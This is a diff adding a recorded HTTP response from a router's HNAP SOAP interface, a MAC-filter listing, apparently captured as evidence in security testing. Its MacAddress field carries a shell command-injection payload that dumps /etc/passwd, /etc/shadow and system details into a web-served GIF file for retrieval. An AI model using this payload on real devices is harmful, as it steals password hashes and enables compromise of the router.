@@ -1,0 +1,30 @@
+HTTP/1.1 200 OK
+Server: WebServer
+Date: Sat, 21 Nov 2026 10:14:28 GMT
+Transfer-Encoding: chunked
+Connection: close
+Content-Type: text/xml; charset=utf-8
+
+386
+<?xml version='1.0' encoding='utf-8'?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<GetMACFilters2Response xmlns="http://purenetworks.com/HNAP1/">
+<GetMACFilters2Result>OK</GetMACFilters2Result>
+<Enabled>false</Enabled>
+<IsAllowList>false</IsAllowList>
+<MACList>
+<MACInfo>
+	<MacAddress>00:11:22:33:44:55;cat /proc/self/status>/var/htdocs/upnp/LAN-1/r09_evidence.gif;uname -a>>/var/htdocs/upnp/LAN-1/r09_evidence.gif;cat /etc/passwd>>/var/htdocs/upnp/LAN-1/r09_evidence.gif;cat /etc/shadow>>/var/htdocs/upnp/LAN-1/r09_evidence.gif;chmod 644 /var/htdocs/upnp/LAN-1/r09_evidence.gif;#</MacAddress>
+	<DeviceName>i278</DeviceName>
+	<ScheduleName></ScheduleName>
+	<Status>false</Status>
+</MACInfo>
+
+</MACList>
+</GetMACFilters2Response>
+</soap:Body>
+</soap:Envelope>
+
+0
+
